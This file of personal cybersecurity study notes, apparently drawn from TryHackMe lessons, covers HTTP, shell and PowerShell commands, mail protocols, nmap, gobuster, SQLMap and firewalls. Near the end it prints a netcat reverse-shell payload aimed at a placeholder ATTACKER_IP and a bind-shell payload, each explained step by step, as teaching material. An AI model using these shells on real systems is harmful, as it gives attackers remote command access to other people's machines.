@@ -1,0 +1,602 @@
+Address Resolution Protocol or ARP for short, is the technology that is responsible for allowing devices to identify themselves on a network.
+
+
+
+HTTP Status Codes:
+In the previous task, you learnt that when a HTTP server responds, the first line always contains a status code informing the client of the outcome of their request and also potentially how to handle it. These status codes can be broken down into 5 different ranges:
+
+
+
+
+100-199 - Information Response	These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.
+
+
+
+200-299 - Success	This range of status codes is used to tell the client their request was successful.
+
+
+
+300-399 - Redirection	These are used to redirect the client's request to another resource. This can be either to a different webpage or a different 
+website altogether.
+
+400-499 - Client Errors	Used to inform the client that there was an error with their request.
+
+
+
+500-599 - Server Errors	This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.
+
+
+
+
+
+
+
+Common HTTP Status Codes:
+
+There are a lot of different HTTP status codes and that's not including the fact that applications can even define their own, we'll go over the most common HTTP responses you are likely to come across:
+
+
+200 - OK	The request was completed successfully.
+
+
+201 - Created	A resource has been created (for example a new user or new blog post).
+
+
+301 - Moved Permanently	This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead.
+
+
+302 - Found	Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future.
+
+
+400 - Bad Request	This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn't send.
+
+
+401 - Not Authorised	You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password.
+
+
+403 - Forbidden	You do not have permission to view this resource whether you are logged in or not.
+
+
+405 - Method Not Allowed	The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead.
+
+
+404 - Page Not Found	The page/resource you requested does not exist.
+
+
+500 - Internal Service Error	The server has encountered some kind of error with your request that it doesn't know how to handle properly.
+
+
+503 - Service Unavailable	
+
+
+This server cannot handle your request as it's either overloaded or down for maintenance.
+
+
+
+Click the "View Site" button on the right to see what some of these HTTP status messages look like in a browser.
+
+
+________________________________________________________________________________________________________________________________________________________
+
+HEADERS.
+
+
+Headers are additional bits of data you can send to the web server when making requests.
+
+Although no headers are strictly required when making a HTTP request, you’ll find it difficult to view a website properly.
+
+Common Request Headers
+
+﻿These are headers that are sent from the client (usually your browser) to the server.
+
+Host: Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you'll just receive the default website for the server.
+
+User-Agent: This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HTML, JavaScript and CSS are only available in certain browsers.
+
+Content-Length: When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn't missing any data.
+
+Accept-Encoding: Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet.
+
+
+Cookie: Data sent to the server to help remember your information (see cookies task for more information).
+Common Response Headers
+
+These are the headers that are returned to the client from the server after a request.
+
+Set-Cookie: Information to store which gets sent back to the web server on each request (see cookies task for more information).
+
+Cache-Control: How long to store the content of the response in the browser's cache before it requests it again.
+
+Content-Type: This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data.
+
+
+Content-Encoding: What method has been used to compress the data to make it smaller when sending it over the internet.
+
+
+
+____________________________________________________________________________________________________________________________________________
+
+Linux commands.
+
+Let's start simple and assume that we already know the name of the file we're looking for — but can't remember where it is exactly! In this case, we're looking for "passwords.txt"
+
+If we remember the filename, we can simply use find -name passwords.txt where the command will look through every folder in our current directory for that specific file.
+
+
+
+
+"Find" has managed to find the file — it turns out it is located in folder1/passwords.txt — sweet. But let's say that we don't know the name of the file, or want to search for every file that has an extension such as ".txt". Find let's us do that too!
+
+We can simply use what's known as a wildcard (*) to search for anything that has .txt at the end. In our case, we want to find every .txt file that's in our current directory. We will construct a command such as find -name *.txt . Where "Find" has been able to find every .txt file and has then given us the location of each one.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Symbol / Operator	Description
+&	This operator allows you to run commands in the background of your terminal.
+&&	This operator allows you to combine multiple commands together in one line of your terminal.
+>	This operator is a redirector - meaning that we can take the output from a command (such as using cat to output a file) and direct it elsewhere.
+>>	
+This operator does the same function of the > operator but appends the output rather than replacing (meaning nothing is overwritten).
+
+
+
+
+Operator "&&"
+This shell operator is a bit misleading in the sense of how familiar is to its partner "&". Unlike the "&" operator, we can use "&&" to make a list of commands to run for example command1 && command2. However, it's worth noting that command2 will only run if command1 was successful.
+
+
+
+However, after using the -a argument (short for --all), we now suddenly have an output with a few more files and folders such as ".hiddenfolder". Files and folders with "." are hidden files.
+
+
+
+
+
+
+
+
+Command	Full Name	Purpose
+touch	touch	Create file
+mkdir	make directory	Create a folder
+cp	copy	Copy a file or folder
+mv	move	Move a file or folder
+rm	remove	Remove a file or folder
+file	file	Determine the type of a file
+
+
+
+
+
+
+
+
+
+
+
+
+
+We're going to cover the use of wget .  This command allows us to download files from the web via HTTP -- as if you were accessing the file in your browser. We simply need to provide the address of the resource that we wish to download. For example, if I wanted to download a file named "myfile.txt" onto my machine, assuming I knew the web address it -- it would look something like this:
+
+wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt
+
+
+
+
+
+th this information, let's craft our scp command (remembering that the format of SCP is just SOURCE and DESTINATION)
+
+scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
+
+
+The command will now look like the following: scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt (reversed scp)
+
+
+
+We can use the friendly ps command to provide a list of the running processes as our user's session and some additional information such as its status code, the session that is running it, how much usage time of the CPU it is using, and the name of the actual program or command that is being executed:
+
+
+
+
+Note how in the screenshot above, the second process ps has a PID of 204, and then in the command below it, this is then incremented to 205.
+
+To see the processes run by other users and those that don't run from a session (i.e. system processes), we need to provide aux to the ps command like so: ps aux
+
+
+
+Another very useful command is the top command; top gives you real-time statistics about the processes running on your system instead of a one-time view. These statistics will refresh every 10 seconds, but will also refresh when you use the arrow keys to browse the various rows. Another great command to gain insight into your system is via the top command
+
+
+ou can send signals that terminate processes; there are a variety of types of signals that correlate to exactly how "cleanly" the process is dealt with by the kernel. To kill a command, we can use the appropriately named kill command and the associated PID that we wish to kill. i.e., to kill PID 1337, we'd use kill 1337
+
+
+SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand
+SIGKILL - Kill the process - doesn't do any cleanup after the fact
+SIGSTOP - Stop/suspend a process
+
+
+
+
+
+
+Let's use the example of backing up files. You may wish to backup "cmnatic"'s  "Documents" every 12 hours. We would use the following formatting: 
+
+0 */12 * * * cp -R /home/cmnatic/Documents /var/backups/
+
+An interesting feature of crontabs is that these also support the wildcard or asterisk (*). If we do not wish to provide a value for that specific field, i.e. we don't care what month, day, or year it is executed -- only that it is executed every 12 hours, we simply just place an asterisk.
+
+
+
+________________________________________________
+
+site:: This operator lets you specify the domain name to which you want to limit your search. For example, we can search for success stories on TryHackMe using site:tryhackme.com success stories.
+
+-: The minus sign allows you to omit search results that contain a particular word or phrase. For example, you might be interested in learning about the pyramids, but you don’t want to view tourism websites; one approach is to search for pyramids -tourism or -tourism pyramids.
+
+filetype:: This search operator is indispensable for finding files instead of web pages. Some of the file types you can search for using Google are Portable Document Format (PDF), Microsoft Word Document (DOC), Microsoft Excel Spreadsheet (XLS), and Microsoft PowerPoint Presentation (PPT). For example, to find cyber security presentations, try searching for filetype:ppt cyber security.
+
+___________________________________________________________________________________________________________________________________________________
+
+netstat -b
+The "netstat -a" command displays all active and inactive connections and the TCP and UDP ports the device is currently listening to. The "netstat -b" command lists all the executables (applications) associated with each connection
+
+_________________________________________________________________________________________________________________________________________________
+
+Changing AD Password Command : (Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose)
+
+Forcing a Password RESET FOR THE USER WHEN LOGGING IN: (Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose).
+
+__________________________________________________________________________________________________________________________________________
+The final networking command we will cover in this room is netstat. This command displays current network connections and listening ports. A basic netstat command with no arguments will show you established connections, as shown below. In this case, we only have one SSH connection; we figured out it is SSH because it is bound to port 22.
+
+If you are curious about the other options, you can run netstat -h, where -h displays the help page. We opted for the following options:
+
+-a displays all established connections and listening ports
+-b shows the program associated with each listening port and established connection
+-o reveals the process ID (PID) associated with the connection
+-n uses a numerical form for addresses and port numbers
+
+We combine these four options and execute the netstat -abon command. The result is quite long, but we display the first few lines in the terminal below. It is clear now that the executable sshd.exe is responsible for listening for incoming connections on port 22, as shown in the first line. We can also see the process ID (PID) associated with each connection.
+_________________________________________________________________________________________________________________________________________________
+dir /a - Displays hidden and system files as well.
+dir /s - Displays files in the current directory and all subdirectories.
+
+You are working with the command line. You are curious about the contents of a particular text file. You can easily view text files with the command type. This command will dump the contents of the text file on the screen; this is convenient for files that fit within your terminal window. You might want to consider more for longer text files. This command will display enough text file contents to fill your terminal window. In other words, for long text files, more will display a single page and wait for you to press Spacebar to move by one page (flip the page) or Enter to move by one line.
+
+
+We can use the wildcard character * to refer to multiple files. For example, copy *.md C:\Markdown will copy all files with the extension md to the directory C:\Markdown.
+
+. Let’s say that we want to search for tasks related to sshd.exe, we can do that with the command tasklist /FI "imagename eq sshd.exe". Note that /FI is used to set the filter image name equals sshd.exe.
+
+With the process ID (PID) known, we can terminate any task using taskkill /PID target_pid. For example, if we want to kill the process with PID 4567, we would issue the command taskkill /PID 4567.
+
+chkdsk: checks the file system and disk volumes for errors and bad sectors.
+driverquery: displays a list of installed device drivers.
+sfc /scannow: scans system files for corruption and repairs them if possible.
+________________________________________________________________________________________________________________________________________________
+
+PS Commands:
+Get-Content: Retrieves (gets) the content of a file and displays it in the console.
+Set-Location: Changes (sets) the current working directory.
+ Get-Command: an essential tool for discovering what commands one can use.
+
+
+
+ Get-Alias lists all aliases available. For example, dir is an alias for Get-ChildItem, and cd is an alias for Set-Location.
+
+
+Get-Help: it provides detailed information about cmdletsAs shown in the results above, Get-Help informs us that we can retrieve other useful information about a cmdlet by appending some options to the basic syntax. For example, by appending -examples to the command displayed above
+(Get-Help Get-Date)
+
+
+For each CommandInfo object retrieved by the cmdlet, some essential information (properties) is displayed on the console. It’s possible to filter the list of commands based on displayed property values. For example, if we want to display only the available commands of type “function”, we can use -CommandType "Function" (Get-Command -CommandType "Function")
+
+
+
+To create an item in PowerShell, we can use New-Item. We will need to specify the path of the item and its type (whether it is a file or a directory)
+ New-Item -Path ".\captain-cabin\captain-wardrobe" -ItemType "Directory"
+ Remove-Item -Path ".\captain-cabin\captain-wardrobe" 
+
+
+f you want to get a list of files in a directory and then sort them by size, you could use the following command in PowerShell:
+  Get-ChildItem | Where-Object -Property "Extension" -eq ".txt" 
+
+
+________________________________________________________________________________________________________________________________________________________
+telnet commands
+
+Echo server: This server echoes everything you send it. By default, it listens on port 7.
+Daytime server: This server listens on port 13 by default and replies with the current day and time.
+Web (HTTP) server: This server listens on TCP port 80 by default and serves web pages.
+
+_______________________________________________________________________________________________________________________________________________________
+treace router (tracert)  how it works.
+
+How can we make every router between our system and a target system reveal itself?
+
+The Internet protocol has a field called Time-to-Live (TTL) that indicates the maximum number of routers a packet can travel through before it is dropped. The router decrements the packet’s TTL by one before it sends it across. When the TTL reaches zero, the router drops the packet and sends an ICMP Time Exceeded message (ICMP Type 11). (In this context, “time” is measured in the number of routers, not seconds.)
+
+The terminal output below shows the result of running traceroute to discover the routers between our system and example.com. Some routers don’t respond; in other words, they drop the packet without sending any ICMP messages. Routers that belong to our ISP might respond, revealing their private IP address. Moreover, some routers respond and show their public IP address, and this would let us look up their domain name and discover their geographic location. Finally, there is always a possibility that an ICMP Time Exceeded message gets blocked and never reaches us.
+________________________________________________________________________________________________________________________________________________________
+Example commands defined by the FTP protocol are:
+
+USER is used to input the username
+PASS is used to enter the password
+RETR (retrieve) is used to download a file from the FTP server to the client.
+STOR (store) is used to upload a file from the client to the FTP server.
+
+Let’s present some of the commands used by your mail client when it transfers an email to an SMTP server:
+
+HELO or EHLO initiates an SMTP session
+MAIL FROM specifies the sender’s email address
+RCPT TO specifies the recipient’s email address
+DATA indicates that the client will begin sending the content of the email message
+. is sent on a line by itself to indicate the end of the email message
+
+
+
+
+Some common POP3 commands are:
+
+USER <username> identifies the user
+PASS <password> provides the user’s password
+STAT requests the number of messages and total size
+LIST lists all messages and their sizes
+RETR <message_number> retrieves the specified message
+DELE <message_number> marks a message for deletion
+QUIT ends the POP3 session applying changes, such as deletions
+
+
+
+
+
+
+The IMAP protocol commands are more complicated than the POP3 protocol commands. We list a few examples below:
+
+LOGIN <username> <password> authenticates the user
+SELECT <mailbox> selects the mailbox folder to work with
+FETCH <mail_number> <data_item_name> Example fetch 3 body[] to fetch message number 3, header and body.
+MOVE <sequence_set> <mailbox> moves the specified messages to another mailbox
+COPY <sequence_set> <data_item_name> copies the specified messages to another mailbox
+LOGOUT logs out
+_______________________________________________________________________________________________________________________________________________________
+
+*NMAP (basics) NOTES*
+
+PS: THAT NMAP NEEDS TO BE RUN AS ROOT SO WE CAN UNLOCK NMAP'S FULL POTENTIAL.
+
+
+Before we start, we should mention that Nmap uses multiple ways to specify its targets:
+
+IP range using -: If you want to scan all the IP addresses from 192.168.0.1 to 192.168.0.10, you can write 192.168.0.1-10
+IP subnet using /: If you want to scan a subnet, you can express it as 192.168.0.1/24, and this would be equivalent to 192.168.0.0-255
+Hostname: You can also specify your target by hostname, for example, example.thm
+Let’s say you want to discover the online hosts on a network. Nmap offers the -sn option, i.e., ping scan. However, don’t expect this to be limited like ping. 
+
+
+ nmap -sL 192.168.0.1/24 will list the 256 targets that will be scanned. This option helps confirm the targets before running the actual scan.
+
+
+Saving Scan Report
+In many cases, we would need to save the scan results. Nmap gives us various formats. The three most useful are normal (human-friendly) output, XML output, and grepable output, in reference to the grep command. You can select the scan report format as follows:
+
+-oN <filename> - Normal output
+-oX <filename> - XML output
+-oG <filename> - grep-able output (useful for grep and awk)
+-oA <basename> - Output in all major formats
+
+________________________________________________________________________________________________________________________________________________________
+
+imagine an HTTP request showing the key parts like the method (e.g., GET or POST), path (e.g., /login), and version (e.g., HTTP/1.1). These elements make up the basics of how a client (user) communicates with a server.
+
+Request Line
+The request line (or start line) is the first part of an HTTP request and tells the server what kind of request it’s dealing with. It has three main parts: the HTTP method, the URL path, and the HTTP version.
+
+Example: METHOD /path HTTP/version
+
+HTTP Methods
+The HTTP method tells the server what action the user wants to perform on the resource identified by the URL path. Here are some of the most common methods and their possible security issue:
+
+GET
+Used to fetch data from the server without making any changes. Reminder! Make sure you’re only exposing data the user is allowed to see. Avoid putting sensitive info like tokens or passwords in GET requests since they can show up as plaintext.
+
+POST
+Sends data to the server, usually to create or update something. Reminder! Always validate and clean the input to avoid attacks like SQL injection or XSS.
+
+PUT
+Replaces or updates something on the server. Reminder! Make sure the user is authorised to make changes before accepting the request.
+
+DELETE
+Removes something from the server. Reminder! Just like with PUT, make sure only authorised users can delete resources.
+
+Besides these common methods, there are a few others used in specific cases:
+
+PATCH
+Updates part of a resource. It’s useful for making small changes without replacing the whole thing, but always validate the data to avoid inconsistencies.
+
+HEAD
+Works like GET but only retrieves headers, not the full content. It’s handy for checking metadata without downloading the full response.
+
+OPTIONS
+Tells you what methods are available for a specific resource, helping clients understand what they can do with the server.
+
+TRACE
+Similar to OPTIONS, it shows which methods are allowed, often for debugging. Many servers disable it for security reasons.
+
+CONNECT
+Used to create a secure connection, like for HTTPS. It’s not as common but is critical for encrypted communication.
+
+Each of these methods has its own set of security rules. For example, PATCH requests should be validated to avoid inconsistencies, and OPTIONS and TRACE should be turned off if not needed to avoid possible security risks.
+
+
+__________________________________________________________________________________________________________________________________________________________
+
+Status Codes and Reason Phrases
+
+
+The Status Code is the number that tells you if the request succeeded or failed, while the Reason Phrase explains what happened. These codes fall into five main categories:
+
+Informational Responses (100-199)
+These codes mean the server has received part of the request and is waiting for the rest. It’s a "keep going" signal.
+
+Successful Responses (200-299)
+These codes mean everything worked as expected. The server processed the request and sent back the requested data.
+
+Redirection Messages (300-399)
+These codes tell you that the resource you requested has moved to a different location, usually providing the new URL.
+
+Client Error Responses (400-499)
+These codes indicate a problem with the request. Maybe the URL is wrong, or you’re missing some required info, like authentication.
+
+Server Error Responses (500-599)
+These codes mean the server encountered an error while trying to fulfil the request. These are usually server-side issues and not the client’s fault.
+
+Common Status Codes
+Here are some of the most frequently seen status codes:
+
+100 (Continue)
+The server got the first part of the request and is ready for the rest.
+
+200 (OK)
+The request was successful, and the server is sending back the requested resource.
+
+301 (Moved Permanently)
+The resource you’re requesting has been permanently moved to a new URL. Use the new URL from now on.
+
+404 (Not Found)
+The server couldn’t find the resource at the given URL. Double-check that you’ve got the right address.
+
+500 (Internal Server Error)
+Something went wrong on the server’s end, and it couldn’t process your request.
+
+________________________________________________________________________________________________________________________________________________________
+
+Gobuster:
+
+this is an example on enumerating a directory:
+
+gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
+
+this is and example on enumerating a subdomain:
+
+gobuster dns -d example.thm -w /path/to/wordlist
+
+Virtual hosts example of enumerating:
+
+gobuster vhost -u "http://example.thm" -w /path/to/wordlist
+
+
+
+__________________________________________________________________________________________________________________________________________________________
+
+Reverse Shell Payload example:
+
+As an example, let's analyze an example payload named a pipe reverse shell, as shown below.
+
+                                  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+
+Explanation of the Payload:
+
+rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+
+mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+
+cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+| bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
+
+| nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
+
+>/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+The payload above can expose the shell bash through the network to the desired listener.
+________________________________________________________________________________________________________________________________________________________
+Bind Shell Payload Example:
+
+						rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+
+Explanation of the Payload:
+
+rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+
+mkfifo /tmp/f - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+
+cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+
+| bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
+
+| nc -l 0.0.0.0 8080 - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.
+>/tmp/f This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.
+
+The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.
+_____________________________________________________________________________________________________________________________________________________________________
+
+SQLMAP:
+
+ As this is a command-line tool, you must open your Linux OS terminal to use it. The --help command with SQLMap will list all the available flags you can use. If you don't want to manually add the flags to each command, use the --wizard flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners.
+
+The --dbs flag helps you to extract all the database names. Once you get to know the database names, you can extract information about the tables of that database by using -D database_name --tables. After obtaining the tables, if you want to enumerate the records in those tables, you can use -D database_name -T table_name --dump
+
+(--dump flag is used for extracting/displaying the records of the table)
+
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+Types of firewalls:
+
+Stateless Firewall
+This type of firewall operates on layer 3 and layer 4 of the OSI model and works solely by filtering the data based on predetermined rules without taking note of the state of the previous connections. This means it will match every packet with the rules regardless of whether it is part of a legitimate connection. It maintains no information on the state of the previous connections to make decisions for future packets. Due to this, these firewalls can process the packets quickly. However, they cannot apply complex policies to the data based on its relationship with the previous connections. Suppose the firewall denies a few packets from a single source based on its rules. Ideally, it should drop all the future packets from this source because the previous packets could not comply with the firewall’s rules. However, the firewall keeps forgetting this, and future packets from this source will be treated as new and matched by its rules again.
+
+Stateful Firewall
+Unlike stateless firewalls, this type of firewall goes beyond filtering packets by predetermined rules. It also keeps track of previous connections and stores them in a state table. This adds another layer of security by inspecting the packets based on their history with connections. Stateful firewalls operate at layer 3 and layer 4 of the OSI model. Suppose the firewall accepts a few packets from a source address based on its rules. In that case, it will take note of this connection in its stated table and allow all the future packets for this connection to automatically get allowed without inspecting each of them. Similarly, the stateful firewalls take note of the connections for which they deny a few packets, and based upon this information, they deny all the subsequent packets coming from the same source.
+
+Proxy Firewall
+The problem with previous firewalls was their inability to inspect the contents of a packet. Proxy firewalls, or application-level gateways, act as intermediaries between the private network and the Internet and operate on the OSI model’s layer 7. They inspect the content of all packets as well. The requests made by users in a network are forwarded by this proxy after inspection and masking them with their own IP address to provide anonymity for the internal IP addresses. Content filtering policies can be applied to these firewalls to allow/deny incoming and outgoing traffic based on their content.
+
+Next-Generation Firewall (NGFW)
+This is the most advanced type of firewall that operates from layer 3 to layer 7 of the OSI model, offering deep packet inspection and other functionalities that enhance the security of incoming and outgoing network traffic. It has an intrusion prevention system that blocks malicious activities in real time. It offers heuristic analysis by analyzing the patterns of attacks and blocking them instantly before reaching the network. NGFWs have SSL/TLS decryption capabilities, which inspect the packets after decrypting them and correlate the data with the threat intelligence feeds to make efficient decisions.
+__________________________________________________________________________________________________________________________________________________________
+
+Tools for automating vulnerability scanning:
+
+Nessus:
+
+Nessus was developed as an open-source project in 1998. It was later acquired by Tenable in 2005 and became proprietary software. It has extensive vulnerability scanning options and is widely used by large enterprises. It is available in both free and paid versions. The free version offers a limited number of scan features. In contrast, its commercial version offers advanced scanning features, unlimited scans, and professional support. Nessus needs to be deployed and managed on-premises.
+
+
+Qualys:
+
+Qualys was developed in 1999 as a subscription-based vulnerability management solution. Along with continuous vulnerability scanning, it provides compliance checks and asset management. It automatically alerts on the vulnerabilities found during continuous monitoring. The best thing about Qualys is that it is a cloud-based platform, which means there is no extra cost or effort to keep it up and running on our physical hardware and manage it.
+
+Nexpose:
+
+Nexpose was developed by Rapid7 in 2005 as a subscription-based vulnerability management solution. It continuously discovers new assets in the network and performs vulnerability scans on them. It gives vulnerability risk scores depending on the asset value and the vulnerability’s impact. It also provides compliance checks against various standards. Nexpose offers both on-premises and hybrid (cloud and on-premises) deployment modes.
+
+
+
+OpenVAS (Open Vulnerability Assessment System):
+
+OpenVAS is an open-source vulnerability assessment solution developed by Greenbone Security. It offers basic features with known vulnerabilities scanned through its database. It is less extensive than commercial tools; however, it gives you the flavor of a complete vulnerability scanner. It is beneficial for small organizations and individual systems. The next section will explore this tool in more detail by performing vulnerability scanning.
+
+__________________________________________________________________________________________________________________________________________________________
+
+CVE:
+
+CVE stands for Common Vulnerabilities and Exposures. Consider CVE a unique number for each of your inquiries and complaints. If there is any update to any issue, you can easily follow up on that using the unique CVE number. Coming out of the help desk example scenario, this CVE number is a unique number given to vulnerabilities. This was developed by the MITRE Corporation. Whenever a new vulnerability is discovered in any software application, it is given a unique CVE number as a reference and published online in a CVE database. This publication aims to make people aware of these vulnerabilities so they can apply protective measures to remediate them. You can find the details of any previously discovered vulnerability in the CVE database.
+
+CVSS:
+
+CVSS stands for Common Vulnerability Scoring System. If we return to the help desk example again, you would always need to prioritize the complaints. The most efficient way to prioritize the complaints is by their severity level. What if all your complaints are registered with a score ranging from 0 to 10, where a higher score indicates a more severe complaint? This would resolve the problem of prioritizing critical complaints. This is called a CVSS score. In the computing world, just as each vulnerability has a CVE number that uniquely identifies it, each has a CVSS score that tells you its severity. The CVSS score is calculated by considering multiple factors, including its impact, ease of exploitability, etc.
+______________________________________________________________________________________________________________________________________________________
+
+
+
+
+
